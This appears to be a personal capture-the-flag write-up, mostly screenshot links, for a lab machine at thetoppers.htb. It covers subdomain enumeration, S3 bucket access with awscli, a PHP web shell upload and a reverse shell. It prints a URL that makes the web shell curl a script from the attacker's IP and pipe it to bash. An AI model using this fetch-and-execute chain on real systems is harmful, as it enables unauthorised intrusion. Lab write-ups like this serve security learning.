#cloud #aws #reverseshell 
![](../../zzImages/Pasted%20image%2020230917145146.png)
![](../../zzImages/Pasted%20image%2020230917145208.png)

Load the website and scroll down:
![](../../zzImages/Pasted%20image%2020230917145428.png)
![](../../zzImages/Pasted%20image%2020230917145523.png)
![](../../zzImages/Pasted%20image%2020230917145553.png)

Add the IP + thetoppers.htb to the /etc/hosts file:
![](../../zzImages/Pasted%20image%2020230917145807.png)
or
![](../../zzImages/Pasted%20image%2020230917145725.png)
![](../../zzImages/Pasted%20image%2020230917145707.png)

![](../../zzImages/Pasted%20image%2020230917150105.png)

## Subdomain Enumeration
Can use wfuzz, gobuster, or feroxbuster

### Using gobuster
![](../../zzImages/Pasted%20image%2020230917155754.png)
![](../../zzImages/Pasted%20image%2020230917155830.png)

s3.thetoppers.htb won't load so let's add it to the etc/hosts file again:
![](../../zzImages/Pasted%20image%2020230917160027.png)

The webpage now loads:
![](../../zzImages/Pasted%20image%2020230917160057.png)

![](../../zzImages/Pasted%20image%2020230917160451.png)
![](../../zzImages/Pasted%20image%2020230917162527.png)

Use awscli to interact with s3 buckets. To install awscli: 

	$ sudo apt install awscli

![](../../zzImages/Pasted%20image%2020230917162606.png)

Configure aws:
![](../../zzImages/Pasted%20image%2020230917164635.png)
![](../../zzImages/Pasted%20image%2020230917160739.png)
![](../../zzImages/Pasted%20image%2020230917162629.png)

List all s3 buckets:
![](../../zzImages/Pasted%20image%2020230917160907.png)
![](../../zzImages/Pasted%20image%2020230917162703.png)

List objects and common prefixes:
![](../../zzImages/Pasted%20image%2020230917160954.png)
![](../../zzImages/Pasted%20image%2020230917162725.png)
![](../../zzImages/Pasted%20image%2020230917161910.png)

## Code Execution
![](../../zzImages/Pasted%20image%2020230917161644.png)

Upload the shell to the website's s3 bucket:
![](../../zzImages/Pasted%20image%2020230917162035.png)

Check to see that the shell.php file has been uploaded:
![](../../zzImages/Pasted%20image%2020230917170400.png)
![](../../zzImages/Pasted%20image%2020230917162110.png)
![](../../zzImages/Pasted%20image%2020230917162824.png)

### Attempt to get a reverse shell 
Save this payload to a new shell.sh file (change <YOUR_IP_ADDRESS>): 
![](../../zzImages/Pasted%20image%2020230917164922.png)
Start a listener:
![](../../zzImages/Pasted%20image%2020230917163206.png)
Start a server (while in the directory the shell script is in):
![](../../zzImages/Pasted%20image%2020230917164942.png)
Use curl to fetch the shell script & pipe it to bash for execution:
![](../../zzImages/Pasted%20image%2020230917163733.png)
![](../../zzImages/Pasted%20image%2020230917163912.png)

Inputting the following URL into the browser gets us a reverse shell:
	http://thetoppers.htb/shell.php?cmd=curl1%2010.10.14.111:8000/shell.sh|bash
![](../../zzImages/Pasted%20image%2020230917165227.png)

## Flag:
Reverse Shell achieved:
![](../../zzImages/Pasted%20image%2020230919153505.png)
![](../../zzImages/Pasted%20image%2020230919153513.png)
